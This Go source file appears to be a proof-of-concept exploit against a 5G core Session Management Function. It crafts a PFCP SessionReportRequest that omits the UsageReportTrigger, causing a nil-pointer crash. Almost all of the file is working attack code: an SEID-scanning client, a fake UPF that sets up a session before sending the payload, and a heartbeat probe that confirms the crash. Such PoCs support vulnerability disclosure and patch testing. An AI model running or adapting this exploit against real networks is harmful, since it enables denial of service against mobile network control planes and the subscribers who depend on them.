func runClient(targetIP string, targetPort int, nodeID string, seid uint64, scan int, srTimeout time.Duration) {
	targetAddr := fmt.Sprintf("%s:%d", targetIP, targetPort)

	log.Printf("[*] Vuln-PA2-06_new: SMF Nil Pointer Dereference PoC")
	log.Printf("[*] Target: %s", targetAddr)
	log.Printf("[*] NodeID: %s", nodeID)
	log.Printf("[*] Attack: SessionReportRequest with UsageReport but no UsageReportTrigger")
	log.Printf("[*] SEID: %d (0x%x)", seid, seid)
	if scan > 1 {
		log.Printf("[*] SEID scan: %d attempts starting from %d", scan, seid)
	}

	raddr, err := net.ResolveUDPAddr("udp", targetAddr)
	if err != nil {
		log.Fatalf("[-] Failed to resolve target address: %v", err)
	}

	conn, err := net.DialUDP("udp", nil, raddr)
	if err != nil {
		log.Fatalf("[-] Failed to create UDP connection: %v", err)
	}
	defer conn.Close()

	log.Printf("[*] Step 0: Establishing PFCP Association...")
	if !establishAssociation(conn, nodeID) {
		log.Printf("[-] Failed to establish association")
		return
	}
	log.Printf("[+] Association established successfully")
	time.Sleep(500 * time.Millisecond)

	log.Printf("[*] Vulnerability: pfcp_reports.go:77")
	log.Printf("[*]   usarTrigger.Volth // nil deref when UsageReportTrigger is missing")
	log.Printf("[*] Path: handler.go:194 -> HandleReports() when ReportType.Usar=true")

	if scan < 1 {
		log.Fatalf("[-] scan must be >= 1")
	}

	for i := 0; i < scan; i++ {
		currentSeid := seid + uint64(i)
		currentSeq := uint32(2 + i)
		payload := buildSessionReportRequestUsarNoTrigger(currentSeid, currentSeq)

		log.Printf("[*] Sending malicious SessionReportRequest...")
		log.Printf("[*] SEID: %d (0x%x) Seq: %d", currentSeid, currentSeid, currentSeq)
		log.Printf("[*] Message length: %d bytes", len(payload))

		_, err = conn.Write(payload)
		if err != nil {
			log.Fatalf("[-] Failed to send message: %v", err)
		}

		log.Printf("[+] Message sent successfully")

		if srTimeout <= 0 {
			break
		}

		rsp, err := waitSessionReportResponse(conn, srTimeout)
		if err != nil {
			if nerr, ok := err.(net.Error); ok && nerr.Timeout() {
				log.Printf("[*] No SessionReportResponse (timeout) - possible crash or drop")
			} else {
				log.Printf("[-] Failed to read SessionReportResponse: %v", err)
			}
			break
		}

		cause, ok := sessionReportCause(rsp)
		if !ok {
			log.Printf("[*] SessionReportResponse received without Cause IE")
			break
		}
		if cause == ie.CauseSessionContextNotFound {
			log.Printf("[-] SEID %d not found on SMF", currentSeid)
			continue
		}
		log.Printf("[*] SessionReportResponse Cause: %d", cause)
		break
	}

	log.Printf("[*] Waiting for crash propagation...")
	log.Printf("[*] NOTE: Requires valid session with established UPF association")

	time.Sleep(2 * time.Second)
	probeSmf(conn)
}

func runFakeUPF(listenIP string, listenPort int, nodeID string, reportDelay time.Duration, smfIP string, smfPort int, sendAssoc bool) {
	listenAddr := fmt.Sprintf("%s:%d", listenIP, listenPort)
	laddr, err := net.ResolveUDPAddr("udp", listenAddr)
	if err != nil {
		log.Fatalf("[-] Failed to resolve listen address: %v", err)
	}

	conn, err := net.ListenUDP("udp", laddr)
	if err != nil {
		log.Fatalf("[-] Failed to listen on %s: %v", listenAddr, err)
	}
	defer conn.Close()

	log.Printf("[*] Fake UPF mode: listening on %s", listenAddr)
	log.Printf("[*] Fake UPF NodeID: %s", nodeID)
	log.Printf("[*] SMF target: %s:%d", smfIP, smfPort)
	log.Printf("[*] Waiting for AssociationSetupResponse, SessionEstablishmentRequest, and SessionModificationRequest...")

	var smfAddr *net.UDPAddr
	if sendAssoc {
		target := fmt.Sprintf("%s:%d", smfIP, smfPort)
		var err error
		smfAddr, err = net.ResolveUDPAddr("udp", target)
		if err != nil {
			log.Fatalf("[-] Failed to resolve SMF address: %v", err)
		}

		if err := sendAssociationSetupRequest(conn, smfAddr, nodeID, 1); err != nil {
			log.Printf("[-] Failed to send AssociationSetupRequest: %v", err)
		} else {
			log.Printf("[+] AssociationSetupRequest sent to %s", target)
		}
	}

	buf := make([]byte, 4096)
	reportSeq := uint32(100)
	assocDone := false
	reportPending := false
	reportSent := false
	var cpSeid uint64
	var smfPeer *net.UDPAddr

	for {
		n, raddr, err := conn.ReadFromUDP(buf)
		if err != nil {
			log.Printf("[-] Read error: %v", err)
			continue
		}

		msg, err := message.Parse(buf[:n])
		if err != nil {
			log.Printf("[-] Failed to parse PFCP message from %s: %v", raddr, err)
			continue
		}

		switch m := msg.(type) {
		case *message.AssociationSetupResponse:
			log.Printf("[+] AssociationSetupResponse from %s (cause=%v)", raddr, m.Cause)
			assocDone = true
		case *message.AssociationSetupRequest:
			reqNodeID := nodeIDFromIE(m.NodeID)
			log.Printf("[*] AssociationSetupRequest from %s (NodeID: %s)", raddr, reqNodeID)
			if err := sendAssociationSetupResponse(conn, raddr, nodeID, m.Sequence()); err != nil {
				log.Printf("[-] Failed to send AssociationSetupResponse: %v", err)
			} else {
				log.Printf("[+] AssociationSetupResponse sent")
			}
			assocDone = true
		case *message.SessionEstablishmentRequest:
			reqNodeID := nodeIDFromIE(m.NodeID)
			cpSeidFromReq, fseidInfo, ok := cpfSeidFromSessionEstablishment(m)
			if !ok {
				log.Printf("[-] SessionEstablishmentRequest missing CPFSEID (NodeID: %s)", reqNodeID)
				continue
			}
			log.Printf("[*] SessionEstablishmentRequest from %s (NodeID: %s)", raddr, reqNodeID)
			log.Printf("[*] CPFSEID: %d (0x%x) IPv4=%s IPv6=%s", cpSeidFromReq, cpSeidFromReq, ipString(fseidInfo.IPv4Address), ipString(fseidInfo.IPv6Address))
			if !assocDone {
				log.Printf("[!] SessionEstablishmentRequest received before AssociationSetupResponse")
			}

			if err := sendSessionEstablishmentResponse(conn, raddr, nodeID, listenIP, cpSeidFromReq, m.Sequence()); err != nil {
				log.Printf("[-] Failed to send SessionEstablishmentResponse: %v", err)
			} else {
				log.Printf("[+] SessionEstablishmentResponse sent")
			}

			cpSeid = cpSeidFromReq
			smfPeer = raddr
			reportPending = true
			log.Printf("[*] Report armed: waiting for SessionModificationRequest before sending SessionReportRequest")
		case *message.SessionModificationRequest:
			reqSeid := m.SEID()
			log.Printf("[*] SessionModificationRequest from %s (SEID: %d)", raddr, reqSeid)
			if err := sendSessionModificationResponse(conn, raddr, reqSeid, m.Sequence()); err != nil {
				log.Printf("[-] Failed to send SessionModificationResponse: %v", err)
			} else {
				log.Printf("[+] SessionModificationResponse sent")
			}

			if reportPending && !reportSent && hasBufferedUpdateFAR(m) {
				if reportDelay > 0 {
					log.Printf("[*] Waiting %s before sending SessionReportRequest...", reportDelay)
					time.Sleep(reportDelay)
				}
				reportSeq++
				reportSeid := cpSeid
				if reportSeid == 0 {
					reportSeid = reqSeid
					log.Printf("[!] CPFSEID not recorded; falling back to SEID from SessionModificationRequest=%d", reportSeid)
				}
				peer := raddr
				if smfPeer != nil {
					peer = smfPeer
				}
				payload := buildSessionReportRequestUsarNoTrigger(reportSeid, reportSeq)
				log.Printf("[*] Sending SessionReportRequest (UsageReport without UsageReportTrigger) to %s", peer)
				if _, err := conn.WriteToUDP(payload, peer); err != nil {
					log.Printf("[-] Failed to send SessionReportRequest: %v", err)
				} else {
					log.Printf("[+] SessionReportRequest sent")
					reportSent = true
				}
			} else if reportPending && !reportSent {
				log.Printf("[*] SessionModificationRequest has no UpdateFAR BUFF action; skipping report")
			}
		case *message.HeartbeatRequest:
			if err := sendHeartbeatResponse(conn, raddr, m.Sequence()); err != nil {
				log.Printf("[-] Failed to send HeartbeatResponse: %v", err)
			}
		default:
			log.Printf("[*] Ignoring %s from %s", msg.MessageTypeName(), raddr)
		}
	}
}

func establishAssociation(conn *net.UDPConn, nodeID string) bool {
	req := message.NewAssociationSetupRequest(
		1,
		ie.NewNodeIDHeuristic(nodeID),
		ie.NewRecoveryTimeStamp(time.Now()),
	)

	payload, err := req.Marshal()
	if err != nil {
		log.Printf("[-] Failed to marshal AssociationSetupRequest: %v", err)
		return false
	}

	log.Printf("[*] Sending AssociationSetupRequest...")
	_, err = conn.Write(payload)
	if err != nil {
		log.Printf("[-] Failed to send AssociationSetupRequest: %v", err)
		return false
	}

	conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	buf := make([]byte, 2048)
	n, err := conn.Read(buf)
	if err != nil {
		log.Printf("[-] No AssociationSetupResponse received: %v", err)
		return false
	}

	msg, err := message.Parse(buf[:n])
	if err != nil {
		log.Printf("[-] Failed to parse AssociationSetupResponse: %v", err)
		return false
	}

	if msg.MessageType() == message.MsgTypeAssociationSetupResponse {
		log.Printf("[+] Received AssociationSetupResponse")
		return true
	}

	log.Printf("[-] Unexpected response type: %d", msg.MessageType())
	return false
}

func sendAssociationSetupRequest(conn *net.UDPConn, raddr *net.UDPAddr, nodeID string, seq uint32) error {
	req := message.NewAssociationSetupRequest(
		seq,
		ie.NewNodeIDHeuristic(nodeID),
		ie.NewRecoveryTimeStamp(time.Now()),
	)
	payload, err := req.Marshal()
	if err != nil {
		return err
	}
	_, err = conn.WriteToUDP(payload, raddr)
	return err
}

func sendAssociationSetupResponse(conn *net.UDPConn, raddr *net.UDPAddr, nodeID string, seq uint32) error {
	rsp := message.NewAssociationSetupResponse(
		seq,
		ie.NewNodeIDHeuristic(nodeID),
		ie.NewCause(ie.CauseRequestAccepted),
		ie.NewRecoveryTimeStamp(time.Now()),
	)
	payload, err := rsp.Marshal()
	if err != nil {
		return err
	}
	_, err = conn.WriteToUDP(payload, raddr)
	return err
}

func sendSessionEstablishmentResponse(conn *net.UDPConn, raddr *net.UDPAddr, nodeID, upfIP string, cpSeid uint64, seq uint32) error {
	v4 := net.ParseIP(upfIP)
	if v4 != nil {
		v4 = v4.To4()
	}
	if v4 == nil {
		v4 = net.ParseIP(nodeID)
		if v4 != nil {
			v4 = v4.To4()
		}
	}

	ies := []*ie.IE{
		ie.NewNodeIDHeuristic(nodeID),
		ie.NewCause(ie.CauseRequestAccepted),
	}
	if v4 != nil {
		if fseid := ie.NewFSEID(cpSeid, v4, nil); fseid != nil {
			ies = append(ies, fseid)
		}
	} else {
		log.Printf("[-] Unable to parse UPF IPv4 from listenIP=%q nodeID=%q; sending response without F-SEID", upfIP, nodeID)
	}

	rsp := message.NewSessionEstablishmentResponse(
		0,
		0,
		cpSeid,
		seq,
		0,
		ies...,
	)
	payload, err := rsp.Marshal()
	if err != nil {
		return err
	}
	_, err = conn.WriteToUDP(payload, raddr)
	return err
}

func sendSessionModificationResponse(conn *net.UDPConn, raddr *net.UDPAddr, seid uint64, seq uint32) error {
	rsp := message.NewSessionModificationResponse(
		0,
		0,
		seid,
		seq,
		0,
		ie.NewCause(ie.CauseRequestAccepted),
	)
	payload, err := rsp.Marshal()
	if err != nil {
		return err
	}
	_, err = conn.WriteToUDP(payload, raddr)
	return err
}

func hasBufferedUpdateFAR(req *message.SessionModificationRequest) bool {
	if req == nil {
		return false
	}
	for _, farIE := range req.UpdateFAR {
		if farIE == nil {
			continue
		}
		if farIE.HasBUFF() {
			return true
		}
	}
	return false
}

func sendHeartbeatResponse(conn *net.UDPConn, raddr *net.UDPAddr, seq uint32) error {
	rsp := message.NewHeartbeatResponse(seq, ie.NewRecoveryTimeStamp(time.Now()))
	payload, err := rsp.Marshal()
	if err != nil {
		return err
	}
	_, err = conn.WriteToUDP(payload, raddr)
	return err
}

func cpfSeidFromSessionEstablishment(req *message.SessionEstablishmentRequest) (uint64, *ie.FSEIDFields, bool) {
	if req == nil || req.CPFSEID == nil {
		return 0, nil, false
	}
	fseid, err := req.CPFSEID.FSEID()
	if err != nil {
		return 0, nil, false
	}
	return fseid.SEID, fseid, true
}

func nodeIDFromIE(nodeIE *ie.IE) string {
	if nodeIE == nil {
		return "unknown"
	}
	nodeID, err := nodeIE.NodeID()
	if err != nil {
		return "unknown"
	}
	return nodeID
}

func ipString(ip net.IP) string {
	if ip == nil {
		return "-"
	}
	return ip.String()
}

// buildSessionReportRequestUsarNoTrigger creates SessionReportRequest with:
// - ReportType.Usar=true (0x02)
// - UsageReport IE with URRID and VolumeMeasurement but WITHOUT UsageReportTrigger
func buildSessionReportRequestUsarNoTrigger(seid uint64, seq uint32) []byte {
	// ReportType IE with USAR flag set.
	reportTypeIE := []byte{
		0x00, 0x27, // Type = 39 (ReportType)
		0x00, 0x01, // Length = 1
		0x02,       // Flags: USAR=1
	}

	// URRID IE.
	urridIE := []byte{
		0x00, 0x51, // Type = 81 (URR-ID)
		0x00, 0x04, // Length = 4
		0x00, 0x00, 0x00, 0x01, // URR ID = 1
	}

	// VolumeMeasurement IE with only volume fields present (flags=0x07).
	volumeMeasurementIE := []byte{
		0x00, 0x42, // Type = 66 (VolumeMeasurement)
		0x00, 0x19, // Length = 25
		0x07,       // Flags: TOVOL/ULVOL/DLVOL present
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, // Total Volume = 4096
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, // Uplink Volume = 2048
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, // Downlink Volume = 2048
	}

	// UsageReportTrigger IE is intentionally omitted.
	usageReportContent := append(urridIE, volumeMeasurementIE...)
	usageReportLen := uint16(len(usageReportContent))

	usageReportIE := []byte{
		0x00, 0x50, // Type = 80 (UsageReport for SessionReportRequest)
		byte(usageReportLen >> 8), byte(usageReportLen), // Length
	}
	usageReportIE = append(usageReportIE, usageReportContent...)

	allIEs := append(reportTypeIE, usageReportIE...)

	msgLen := uint16(12 + len(allIEs))
	header := make([]byte, 16)
	header[0] = 0x21                               // Version=1, S=1
	header[1] = 56                                 // Message Type = SessionReportRequest
	binary.BigEndian.PutUint16(header[2:4], msgLen)
	binary.BigEndian.PutUint64(header[4:12], seid)
	header[12] = byte(seq >> 16)
	header[13] = byte(seq >> 8)
	header[14] = byte(seq)
	header[15] = 0x00

	return append(header, allIEs...)
}

func waitSessionReportResponse(conn *net.UDPConn, timeout time.Duration) (*message.SessionReportResponse, error) {
	deadline := time.Now().Add(timeout)
	buf := make([]byte, 2048)

	for {
		conn.SetReadDeadline(deadline)
		n, err := conn.Read(buf)
		if err != nil {
			return nil, err
		}

		msg, err := message.Parse(buf[:n])
		if err != nil {
			continue
		}

		if rsp, ok := msg.(*message.SessionReportResponse); ok {
			return rsp, nil
		}
	}
}

func sessionReportCause(rsp *message.SessionReportResponse) (uint8, bool) {
	if rsp == nil || rsp.Cause == nil {
		return 0, false
	}

	cause, err := rsp.Cause.Cause()
	if err != nil {
		return 0, false
	}

	return cause, true
}

func probeSmf(conn *net.UDPConn) {
	log.Printf("[*] Sending HeartbeatRequest probe...")

	req := message.NewHeartbeatRequest(
		0x1234,
		ie.NewRecoveryTimeStamp(time.Now()),
		nil,
	)
	payload, _ := req.Marshal()

	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	_, err := conn.Write(payload)
	if err != nil {
		log.Printf("[+] SMF appears to be down (write error)")
		log.Printf("[+] VULNERABILITY CONFIRMED")
		return
	}

	buf := make([]byte, 1024)
	_, err = conn.Read(buf)
	if err != nil {
		log.Printf("[+] SMF appears to be down (no heartbeat response)")
		log.Printf("[+] VULNERABILITY CONFIRMED: SMF crashed")
	} else {
		log.Printf("[-] SMF is still responding")
		log.Printf("[-] Check: SEID validity, valid session with established UPF required")
	}
}

